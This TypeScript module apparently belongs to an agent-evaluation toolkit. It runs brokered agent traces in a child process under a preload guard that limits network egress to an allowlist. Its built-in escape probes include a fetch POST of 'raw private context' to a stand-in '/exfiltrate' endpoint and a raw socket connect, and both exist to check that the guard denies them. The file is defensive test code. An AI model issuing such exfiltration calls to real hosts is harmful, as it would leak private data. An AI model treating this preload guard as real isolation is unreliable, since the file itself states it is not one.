import { spawn } from "node:child_process";
import { createHmac, timingSafeEqual } from "node:crypto";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import {
  brokerExternalTrace,
  verifyBrokerAttestation,
  type BrokerActionResult,
  type BrokeredTraceAttestation
} from "./traceBroker";
import type { ExternalAgentTrace } from "../evals/externalTraceEvaluator";

export interface RunnerGuardAuditEvent {
  api: string;
  host: string;
  allowed: boolean;
  reason: string;
}

export interface RunnerActionExecution {
  actionId: string;
  brokerDecision: BrokerActionResult["brokerDecision"];
  attemptedInChild: boolean;
  observedStatus: "executed" | "skipped_by_broker" | "denied_by_guard" | "failed";
  targetHost: string;
  api: string | null;
  errorCode: string | null;
  passed: boolean;
}

export interface RunnerEscapeAttempt {
  id: string;
  api: string;
  targetHost: string;
  expectedDenied: boolean;
  observedDenied: boolean;
  errorCode: string | null;
  passed: boolean;
}

export interface SandboxedExecutionAttestation {
  attestationId: string;
  traceId: string;
  brokerAttestationId: string;
  runnerVersion: "0.16.0-sandboxed-trace-runner";
  runnerMode: "node_child_process_preload_guard";
  generatedAt: string;
  brokerSignatureValid: boolean;
  childExitCode: number | null;
  brokerSubmittedActionCount: number;
  brokerExecutedActionCount: number;
  brokerBlockedActionCount: number;
  childExecutedActionCount: number;
  skippedByBrokerCount: number;
  escapeAttemptCount: number;
  guardDeniedEscapeCount: number;
  guardAuditEventCount: number;
  actionExecutions: RunnerActionExecution[];
  escapeAttempts: RunnerEscapeAttempt[];
  guardAuditEvents: RunnerGuardAuditEvent[];
  passed: boolean;
  limitations: string[];
  signature: {
    algorithm: "HMAC-SHA256";
    keyId: "paisl-sandboxed-runner-fixture-v1";
    canonicalization: "json-stable-sort-v1";
    value: string;
  };
}

const GENERATED_AT = "2026-05-23T00:00:00.000Z";
const RUNNER_SIGNING_KEY = "paisl-public-fixture-sandboxed-runner-key-not-secret-v1";
const ALLOWED_HOSTS = "provider.example,privatecompute.example,federated.example";

const PRELOAD_SOURCE = `
import { appendFileSync } from "node:fs";
import http from "node:http";
import https from "node:https";
import net from "node:net";
import tls from "node:tls";

const auditPath = process.env.PAISL_SANDBOX_AUDIT;
const allowHosts = new Set(
  (process.env.PAISL_SANDBOX_ALLOW_HOSTS || "")
    .split(",")
    .map((host) => host.trim())
    .filter(Boolean)
);

function audit(api, host, allowed, reason) {
  if (!auditPath) return;
  appendFileSync(auditPath, JSON.stringify({ api, host, allowed, reason }) + "\\n");
}

function denied(api, host, reason) {
  audit(api, host, false, reason);
  const error = new Error("PAISL sandbox denied egress: " + api + " " + host);
  error.code = "PAISL_SANDBOX_EGRESS_DENIED";
  throw error;
}

function hostFromUrlLike(input, options) {
  if (typeof input === "string" || input instanceof URL) {
    return new URL(input.toString()).host;
  }
  if (input && typeof input === "object" && "href" in input) {
    return new URL(input.href).host;
  }
  const candidate = options && typeof options === "object" ? options : input;
  const host = candidate?.hostname || candidate?.host || "unknown-host";
  const port = candidate?.port ? ":" + candidate.port : "";
  return String(host).includes(":") ? String(host) : String(host) + port;
}

function assertAllowed(api, host) {
  if (!allowHosts.has(host)) {
    denied(api, host, "host_not_in_sandbox_allowlist");
  }
  audit(api, host, true, "host_allowed_by_sandbox_guard");
}

globalThis.fetch = async function paislSandboxedFetch(input) {
  const url = typeof input === "string" || input instanceof URL ? input.toString() : input.url;
  const host = new URL(url).host;
  assertAllowed("fetch", host);
  return new Response("sandbox accepted synthetic request", { status: 202 });
};

function patchHttpModule(module, moduleName) {
  module.request = function guardedRequest(input, options) {
    const host = hostFromUrlLike(input, options);
    assertAllowed(moduleName + ".request", host);
    denied(moduleName + ".request", host, "synthetic_guard_does_not_execute_real_network");
  };
  module.get = function guardedGet(input, options) {
    const host = hostFromUrlLike(input, options);
    assertAllowed(moduleName + ".get", host);
    denied(moduleName + ".get", host, "synthetic_guard_does_not_execute_real_network");
  };
}

patchHttpModule(http, "http");
patchHttpModule(https, "https");

function blockRawSocket(api, args) {
  const first = args[0];
  const host =
    typeof first === "object" && first !== null
      ? String(first.host || first.hostname || "unknown-host")
      : typeof args[1] === "string"
        ? args[1]
        : "unknown-host";
  denied(api, host, "raw_socket_denied_even_when_host_is_allowed");
}

net.connect = function guardedNetConnect(...args) {
  blockRawSocket("net.connect", args);
};
net.createConnection = function guardedCreateConnection(...args) {
  blockRawSocket("net.createConnection", args);
};
tls.connect = function guardedTlsConnect(...args) {
  blockRawSocket("tls.connect", args);
};
`;

const CHILD_SOURCE = `
import { readFileSync } from "node:fs";
import net from "node:net";

const attestation = JSON.parse(readFileSync(process.env.PAISL_BROKER_ATTESTATION_PATH, "utf8"));

async function attemptAction(result) {
  if (result.brokerDecision !== "executed") {
    return {
      actionId: result.actionId,
      brokerDecision: result.brokerDecision,
      attemptedInChild: false,
      observedStatus: "skipped_by_broker",
      targetHost: result.targetHost,
      api: null,
      errorCode: null,
      passed: true
    };
  }

  if (result.layer === "local") {
    return {
      actionId: result.actionId,
      brokerDecision: result.brokerDecision,
      attemptedInChild: true,
      observedStatus: "executed",
      targetHost: result.targetHost,
      api: null,
      errorCode: null,
      passed: true
    };
  }

  try {
    const response = await fetch("https://" + result.targetHost + "/paisl-runner/" + result.actionId, {
      method: "POST",
      body: JSON.stringify({ actionId: result.actionId, releaseForm: result.releaseForm })
    });
    return {
      actionId: result.actionId,
      brokerDecision: result.brokerDecision,
      attemptedInChild: true,
      observedStatus: response.status === 202 ? "executed" : "failed",
      targetHost: result.targetHost,
      api: "fetch",
      errorCode: null,
      passed: response.status === 202
    };
  } catch (error) {
    return {
      actionId: result.actionId,
      brokerDecision: result.brokerDecision,
      attemptedInChild: true,
      observedStatus: error?.code === "PAISL_SANDBOX_EGRESS_DENIED" ? "denied_by_guard" : "failed",
      targetHost: result.targetHost,
      api: "fetch",
      errorCode: error?.code ?? "ERROR",
      passed: false
    };
  }
}

async function attemptEscape(id, api, targetHost, fn) {
  try {
    await fn();
    return {
      id,
      api,
      targetHost,
      expectedDenied: true,
      observedDenied: false,
      errorCode: null,
      passed: false
    };
  } catch (error) {
    return {
      id,
      api,
      targetHost,
      expectedDenied: true,
      observedDenied: error?.code === "PAISL_SANDBOX_EGRESS_DENIED",
      errorCode: error?.code ?? "ERROR",
      passed: error?.code === "PAISL_SANDBOX_EGRESS_DENIED"
    };
  }
}

const actionExecutions = [];
for (const result of attestation.actionResults) {
  actionExecutions.push(await attemptAction(result));
}

const escapeAttempts = [];
escapeAttempts.push(await attemptEscape("untrusted-fetch-escape", "fetch", "untrusted.example", () =>
  fetch("https://untrusted.example/exfiltrate", { method: "POST", body: "raw private context" })
));
escapeAttempts.push(await attemptEscape("raw-socket-escape", "net.connect", "provider.example", () =>
  net.connect({ host: "provider.example", port: 443 })
));

process.stdout.write(JSON.stringify({ actionExecutions, escapeAttempts }) + "\\n");
`;

function sortForSignature(value: unknown): unknown {
  if (Array.isArray(value)) {
    return value.map(sortForSignature);
  }
  if (value && typeof value === "object") {
    return Object.fromEntries(
      Object.entries(value as Record<string, unknown>)
        .filter(([, entry]) => entry !== undefined)
        .sort(([a], [b]) => a.localeCompare(b))
        .map(([key, entry]) => [key, sortForSignature(entry)])
    );
  }
  return value;
}

function canonical(value: unknown): string {
  return JSON.stringify(sortForSignature(value));
}

function hmac(value: unknown): string {
  return createHmac("sha256", RUNNER_SIGNING_KEY).update(canonical(value)).digest("hex");
}

function unsignedAttestation(
  attestation: SandboxedExecutionAttestation
): Omit<SandboxedExecutionAttestation, "signature"> {
  const { signature: _signature, ...unsigned } = attestation;
  return unsigned;
}

function parseJsonl(contents: string): RunnerGuardAuditEvent[] {
  return contents
    .split("\n")
    .filter((line) => line.trim().length > 0)
    .map((line) => JSON.parse(line) as RunnerGuardAuditEvent);
}

function parseChildStdout(stdout: string): {
  actionExecutions: RunnerActionExecution[];
  escapeAttempts: RunnerEscapeAttempt[];
} {
  const lastLine = stdout
    .trim()
    .split("\n")
    .filter((line) => line.trim().length > 0)
    .at(-1);
  if (!lastLine) {
    return { actionExecutions: [], escapeAttempts: [] };
  }
  return JSON.parse(lastLine) as {
    actionExecutions: RunnerActionExecution[];
    escapeAttempts: RunnerEscapeAttempt[];
  };
}

async function executeInGuardedChild(
  brokerAttestation: BrokeredTraceAttestation
): Promise<{
  childExitCode: number | null;
  actionExecutions: RunnerActionExecution[];
  escapeAttempts: RunnerEscapeAttempt[];
  guardAuditEvents: RunnerGuardAuditEvent[];
}> {
  const dir = await mkdtemp(join(tmpdir(), "paisl-sandbox-runner-"));
  try {
    const preloadPath = join(dir, "paisl-sandbox-preload.mjs");
    const attestationPath = join(dir, "broker-attestation.json");
    const auditPath = join(dir, "sandbox-audit.jsonl");
    await writeFile(preloadPath, PRELOAD_SOURCE);
    await writeFile(attestationPath, JSON.stringify(brokerAttestation));
    await writeFile(auditPath, "");

    const child = spawn(process.execPath, ["--import", preloadPath, "--input-type=module", "-e", CHILD_SOURCE], {
      cwd: resolve("."),
      env: {
        ...process.env,
        PAISL_BROKER_ATTESTATION_PATH: attestationPath,
        PAISL_SANDBOX_AUDIT: auditPath,
        PAISL_SANDBOX_ALLOW_HOSTS: ALLOWED_HOSTS
      },
      stdio: ["ignore", "pipe", "pipe"]
    });

    const stdoutChunks: Buffer[] = [];
    child.stdout.on("data", (chunk: Buffer) => stdoutChunks.push(chunk));
    child.stderr.resume();

    const childExitCode = await new Promise<number | null>((resolveExit) => {
      child.on("close", (code) => resolveExit(code));
    });
    const parsed = parseChildStdout(Buffer.concat(stdoutChunks).toString("utf8"));
    const guardAuditEvents = parseJsonl(await readFile(auditPath, "utf8"));

    return {
      childExitCode,
      actionExecutions: parsed.actionExecutions,
      escapeAttempts: parsed.escapeAttempts,
      guardAuditEvents
    };
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

export async function runSandboxedTrace(
  trace: ExternalAgentTrace
): Promise<SandboxedExecutionAttestation> {
  const brokerAttestation = brokerExternalTrace(trace);
  const brokerVerification = verifyBrokerAttestation(brokerAttestation);
  const childRun = await executeInGuardedChild(brokerAttestation);
  const childExecutedActionCount = childRun.actionExecutions.filter(
    (execution) => execution.observedStatus === "executed"
  ).length;
  const skippedByBrokerCount = childRun.actionExecutions.filter(
    (execution) => execution.observedStatus === "skipped_by_broker"
  ).length;
  const guardDeniedEscapeCount = childRun.escapeAttempts.filter((attempt) => attempt.observedDenied).length;
  const unsigned = {
    attestationId: `sandboxed-execution-${trace.traceId}`,
    traceId: trace.traceId,
    brokerAttestationId: brokerAttestation.attestationId,
    runnerVersion: "0.16.0-sandboxed-trace-runner" as const,
    runnerMode: "node_child_process_preload_guard" as const,
    generatedAt: GENERATED_AT,
    brokerSignatureValid: brokerVerification.valid,
    childExitCode: childRun.childExitCode,
    brokerSubmittedActionCount: brokerAttestation.submittedActionCount,
    brokerExecutedActionCount: brokerAttestation.executedActionCount,
    brokerBlockedActionCount: brokerAttestation.blockedActionCount,
    childExecutedActionCount,
    skippedByBrokerCount,
    escapeAttemptCount: childRun.escapeAttempts.length,
    guardDeniedEscapeCount,
    guardAuditEventCount: childRun.guardAuditEvents.length,
    actionExecutions: childRun.actionExecutions,
    escapeAttempts: childRun.escapeAttempts,
    guardAuditEvents: childRun.guardAuditEvents,
    passed:
      brokerVerification.valid &&
      childRun.childExitCode === 0 &&
      childRun.actionExecutions.every((execution) => execution.passed) &&
      childRun.escapeAttempts.every((attempt) => attempt.passed),
    limitations: [
      "Sandboxed execution attestations are deterministic local child-process evidence, not production sandboxing.",
      "The preload guard prevents the probed Fetch and raw-socket paths, but it is not a kernel firewall or container policy.",
      "The execution signature uses a public fixture key so reports are reproducible; it is not identity-bound non-repudiation.",
      "Broker-blocked actions are skipped before child execution; independent systems still need to submit runnable artifacts for external validation."
    ]
  };
  const signature = {
    algorithm: "HMAC-SHA256" as const,
    keyId: "paisl-sandboxed-runner-fixture-v1" as const,
    canonicalization: "json-stable-sort-v1" as const,
    value: hmac(unsigned)
  };

  return { ...unsigned, signature };
}

export function verifySandboxedExecutionAttestation(attestation: SandboxedExecutionAttestation): {
  valid: boolean;
  reason: string;
} {
  const expected = hmac(unsignedAttestation(attestation));
  const expectedBuffer = Buffer.from(expected, "hex");
  const actualBuffer = Buffer.from(attestation.signature.value, "hex");
  const valid =
    actualBuffer.length === expectedBuffer.length && timingSafeEqual(actualBuffer, expectedBuffer);

  return valid
    ? { valid: true, reason: "Sandboxed execution signature matches the canonical payload." }
    : { valid: false, reason: "Sandboxed execution signature does not match the canonical payload." };
}
